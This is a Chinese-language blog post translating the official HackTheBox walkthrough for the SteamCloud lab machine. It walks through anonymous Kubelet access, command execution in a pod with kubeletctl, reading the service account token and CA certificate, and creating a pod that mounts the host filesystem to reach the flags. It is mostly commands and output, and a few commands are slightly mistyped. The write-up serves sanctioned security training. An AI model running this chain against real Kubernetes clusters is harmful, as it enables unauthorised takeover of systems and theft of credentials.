+++
title = 'HTB SteamCloud'
date = 2024-04-21T14:37:10+08:00
description = 'HackTheBox SteamCloud Walkthrough'
math = false
tags = [
    "Linux",
    "Docker Escape",


]
categories = [
    "HackTheBox"
]
draft = false
+++

[![20240421144115](https://raw.githubusercontent.com/iselt/ImageBed/main/20240421144115.png)](https://app.hackthebox.com/machines/SteamCloud)

> 翻译自官方 Walkthrough

## 概要

SteamCloud 是一台简单难度的机器。端口扫描显示它有一堆 Kubernetes 特定端口开放。我们无法枚举 Kubernetes API，因为它需要身份验证。现在，由于 Kubelet 允许匿名访问，我们可以通过枚举 Kubelet 服务提取 K8s 集群中所有 pod 的列表。此外，我们可以进入其中一个 pod 并获取用于身份验证到 Kubernetes API 的密钥。现在我们可以创建和生成一个恶意 pod，然后使用 Kubectl 在 pod 中运行命令来读取 root 标志。

## 技能要求

- 基本 Linux 知识
- 基本 Kubernetes 枚举

## 学到的技能

- 利用 Kubernetes

## 枚举

让我们扫描目标 IP，看看我们是否能发现什么值得注意的东西。

```bash
nmap 10.129.96.98 --max-retries=0 -T4 -p-
```

```txt
PORT      STATE SERVICE
22/tcp    open  ssh
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10250/tcp open  unknown
```

Nmap 显示了几个有趣的端口，SSH 默认端口为 22。Etcd 是一个 Kubernetes 组件，客户端监听端口为 2379，服务器端口为 2380。Kubelet 是一个 Kubernetes 扩展，默认监听端口为 10250，Kubernetes API 监听端口为 8443。让我们看看 Kubernetes API，它在 8443 端口上可访问。

```bash
curl https://10.129.96.98:8443/ -k
```

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {

  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {

  },
  "code": 403
}
```

输出显示我们无法在未经身份验证的情况下访问主目录，因此让我们继续查看监听在 10250 端口上的 Kubelet 服务。

```bash
curl https://10.129.96.98:10250/pods -k
```

```json
...
0{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"kube-apiserver-steamcloud","namespace":"kube-system","selfLink":"/api/v1/namespaces/kube-system/pods/kube-apiserver-steamcloud",
...
```

我们能够提取 k8s 集群中的所有 pod。虽然这个服务有几个未记录的 API，但我们可以使用 [`kubeletctl`](https://github.com/cyberark/kubeletctl) 与之交互，并找到一种方法进入一个 pod。让我们下载并安装 `kubeletctl` 二进制文件。

```bash
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd
chmod a+x ./kubeletctl_linux_amd
mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

让我们看看我们是否可以使用 kubeletctl 获取所有 pod。

```bash
kubeletctl --server 10.129.96.98 pods
```

Pods from Kubelet
| |POD | NAMESPACE | CONTAINERS |
| --- | --- | --- | --- |
| 1|coredns-78fcd69978-zbwf9 | kube-system | coredns |
| 2|nginx | default | nginx |
| 3|etcd-steamcloud | kube-system | etcd |

...

成功返回了所有 pod 的列表。

## 立足点

我们已经知道 Nginx 仅存在于默认命名空间中，不是一个与 Kubernetes 相关的 pod。由于 Kubelet 允许匿名访问，我们可以使用命令 `/run`、`/exec` 和 `/cri`，但 curl 没用，因为它只允许 WebSocket 连接。我们可以使用 Kubeletctl 中的 `scan rce` 命令来确定我们是否可以在任何 pod 上运行命令。

```bash
kubeletctl --server 10.129.96.98 scan rce
```

Node with pods vulnerable to RCE

|| NODE IP | PODS | NAMESPACE | CONTAINERS | RCE |
| --- | --- | --- | --- | --- | --- |
|1|10.129.96.98 | nginx | default | nginx | + |
|2| | etcd-steamcloud | kube-system | etcd | - |

结果表明可以在 Nginx pod 上执行命令。让我们看看我们是否可以在 Nginx 中运行 id。

```bash
kubeletctl --server 10.129.96.98 exec "id" -p nginx -c nginx
```

```txt
uid=0(root) gid=0(root) groups=0(root)
```

命令成功执行，但似乎在这个 pod 上没有用户标志。

## 提权

现在我们已经成功在 Nginx pod 中执行了一个命令，让我们看看是否可以访问令牌和证书，以便我们可以创建一个具有更高权限的服务帐户。

```bash
kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```

```txt
eyJhbGciOiJSUzI1NiIsImtpZCI6ImR5VFdmTTk2WnRENW5QVWRfaXF0SFhTV1VVeG9fWkRGQm9hMTN4VlBzRmifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjY4Njk2NzI4LCJpYXQiOjE2MzcxNjA3MjgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjQ5ZWU5NDJiLTIzOGEtNDc4OS1hNWI4LTNiZjEyNDMzZGRkMCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjZlZTFmOGM3LWI5ODAtNDQ0Ny04YTQyLWExM2IyOWZmOWUwNSJ9LCJ3YXJuYWZ0ZXIiOjE2MzcxNjQzMzV9LCJuYmYiOjE2MzcxNjA3MjgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.fjXI9IRBz1YuJTUu-H5Sl_vSt36CRdCgaIjpnd04_Lbz03d9v76lNlzAy6X3H8n1mhsw1_lKuJskgad1e8-b7BaqeVrZk8Kj-7r06xrvYUiIZgJ3AkvR2G-B1Iv1YiyEZymKuDVvBkWLIKgAcl8H0HsJ-kNdeIF9HjdeLIH0M5nzTyRVymiXp61_QkQ8edFNVb3aH2SqKE1nE9hOXcc5uQ8k1djoCOwN-kuPrvnxm6MVQ_xsGgPNU_a2vMJk4zQJBXPi2-LeyDudg2xkjRejcPH6Ia7xrD8jMs0PHYlXk5FBQLZzi2PbIBqHRXIbwvM5JZe5y57OY_UfT3OKQH6Sdw
```

```txt
 -----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTExNTExNDUyOVoXDTMxMTExNDExNDUyOVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJ5e
vZyukR7NVz3KtzprRBO0oDPOMBPIhOyHfkhVvn1oRtDVyK5ivlvIYdSFUp6OVJGq
3KTGq/cU3UCULcdAm4fUUNddkhuhGyzSnIy80yu9PAnCWqebi3tMykvpNdV7NqAs
aVh+iRLc7I0w9Bi1zU0DvMIDwvEgSbkpd06+aBKfg3P2zbosHUhGyPw5V5nfGhcE
SKdMLyCaEpmJg8hHIMMqDOthTUoVKXxtLUFlYu7GPspXeWIv2CmH383MslUgx5ak
SI57eh9mzPZXVh3cjcJWejoq00LNLoVdm+bdUzn8pvVIxvzellHzQ/IcpLT/GufE
DAFvCfOndI+AOCKu4jMCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBRG6VO+4YmEyjQkvCBG3vYqpneGajANBgkqhkiG9w0BAQsFAAOCAQEAAF2csmso
G+AfEm0U+wAxTNtEkUBdk0seswj7TkQyCwt5qGgX4wctjCo0kwvgmnz5QpWM0t0M
GFoUUWCtIYWCzS/W1QK04PTI9/4IgJOEi584SBCx+/cF4HTSB3+a3dWp9OXd/KP
rkjaZZU2DUZfp4B5brBUmP5h1MTnXJnI+5jcmF7kF6uhE4DgYbMrj7SkG/egT5GX
6cwgh4RhMzdTJxdVCVhjACynSUvg4sllk2YF/0Nda/v3C8gDhUDcO6qyXqfutAGE
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

访问令牌和证书已经成功获取。

我们可以使用这些登录到 Kubectl 并检查我们有什么样的权限。将证书保存在名为 ca.crt 的文件中，并将令牌导出为环境变量。

```bash
export token="eyJhbGciOiJSUz<SNIP>"
```

然后运行以下命令获取 pod 列表。

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 get pods
```

```txt
NAME    READY   STATUS  RESTARTS    AGE
nginx   1/1     Running 2 (42m ago) 44m
```

默认服务帐户似乎具有一些基本权限，因此让我们使用 `auth can-i` 列出所有这些权限。

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 auth can-i --list
```

```txt
Resources                                       Non-Resource URLs  Resource Names  Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                 []              [create]
selfsubjectrulesreviews.authorization.k8s.io    []                 []              [create]
pods                                            []                 []              [get create list]
```

我们可以在默认命名空间中获取、列出和创建 pod。为了创建一个 pod，我们可以使用 Nginx 镜像。让我们创建一个恶意 pod。将以下 YAML 配置保存在名为 f.yaml 的文件中。

```yaml
apiVersion: v
kind: Pod
metadata:
    name: nginxt
    namespace: default
spec:
    containers:
    - name: nginxt
      image: nginx:1.14.2
      volumeMounts:
      - mountPath: /root
        name: mount-root-into-mnt
    volumes:
    - name: mount-root-into-mnt
      hostPath:
        path: /
    automountServiceAccountToken: true
    hostNetwork: true
```

我们使用相同的 Nginx 镜像，并在容器中挂载主机文件系统，以便我们可以访问它。一旦我们创建了它，我们可以使用 Kubeletctl 在 pod 中运行命令。让我们尝试应用配置并查看我们新生成的 pod 是否正在运行。

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 apply -f f.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=<https://10.129.96.98:8443> get pods
```

```txt
NAME    READY   STATUS  RESTARTS    AGE
nginx   1/1     Running 4 (35m ago) 81m
nginxt  1/1     Running 0           9s
```

我们的 pod 状态良好，正在运行。现在我们可以同时获取 user 和 root flags。

```bash
kubeletctl --server 10.129.96.98 exec "cat /root/home/user/user.txt" -p nginxt -c nginxt
kubeletctl --server 10.129.96.98 exec "cat /root/root/root.txt" -p nginxt -c nginxt
```
